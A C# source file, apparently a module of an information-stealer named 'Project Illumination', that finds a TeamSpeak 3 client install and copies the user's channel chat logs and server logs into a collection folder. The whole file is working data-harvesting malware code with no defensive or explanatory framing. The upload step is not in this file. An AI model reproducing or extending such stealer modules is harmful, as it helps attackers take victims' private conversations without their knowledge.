using System.IO;

namespace Project_Illumination.Exploits.Programs
{
    internal class TeamSpeak
    {
        private readonly string _path, _teamSpeak;
        private readonly bool _channelChats, _serverLog;
        private readonly long _minFileSize;
        public TeamSpeak(bool channelChats = true, bool serverLog = true, long minFileSize = 50)
        {
            if (!Directory.Exists(_teamSpeak = @$"{Paths.PROGRAMS}\TeamSpeak 3 Client")) return;
            Directory.CreateDirectory(_path = $@"{Paths.SAVE_PATH}\Programs\TeamSpeak");

            _channelChats = channelChats;
            _serverLog = serverLog;
            _minFileSize = minFileSize;
        }

        public void Run()
        {
            if (!_channelChats && !_serverLog) return;
            if (!Directory.Exists($@"{_teamSpeak}\config\chats")) return;

            var i = 0;
            foreach (var server in Directory.GetDirectories($@"{_teamSpeak}\config\chats"))
            {
                var newDirectoryPath = $@"{_path}\{i + 1}";
                Directory.CreateDirectory(newDirectoryPath);

                foreach (var chatFile in Directory.GetFiles(server, "*.txt"))
                {
                    var fileInfo = new FileInfo(chatFile);
                    if (fileInfo.Length < _minFileSize) continue;

                    if (fileInfo.Name.StartsWith("channel") && _channelChats) File.Copy(chatFile, $@"{newDirectoryPath}\{fileInfo.Name}");
                    if (fileInfo.Name.StartsWith("server") && _serverLog) File.Copy(chatFile, $@"{newDirectoryPath}\{fileInfo.Name}");
                }

                if (Directory.GetFiles(newDirectoryPath).Length == 0) Directory.Delete(newDirectoryPath);
                else i++;
            }
        }
    }
}
